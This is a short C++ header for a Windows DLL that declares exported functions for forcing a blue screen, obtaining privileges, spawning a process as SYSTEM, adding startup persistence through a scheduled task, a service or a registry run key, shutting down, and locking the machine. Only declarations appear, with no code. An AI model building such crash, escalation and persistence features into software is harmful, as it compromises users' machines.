#define _WIN32_WINNT 0x601
#include <windows.h>
#include <stdio.h>
#include <lm.h> 
#include <time.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <iostream>
#include <string.h>
#include <fstream>
#include <io.h>
#include <stdbool.h>
#include <taskschd.h>
#include <comdef.h> 
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsuppw.lib")
extern "C"
{
    __declspec(dllexport) void BlueScreen();
    __declspec(dllexport) BOOL CreateInSystem(LPWSTR processName);
    __declspec(dllexport) BOOL GetPrivileges();
    __declspec(dllexport) BOOL ITaskToStartup(const std::wstring& appPath);
    __declspec(dllexport) BOOL ServiceAddStartup(LPCTSTR serviceName, LPCTSTR displayName, LPCTSTR binaryPath);
    __declspec(dllexport) BOOL RootKeyAddStartup(LPCTSTR lpApplicationName, LPCTSTR lpKeyName);
    __declspec(dllexport) int GetProcessPermission();
    __declspec(dllexport) BOOL shutdown_();
    __declspec(dllexport) void LogicalLock();
}
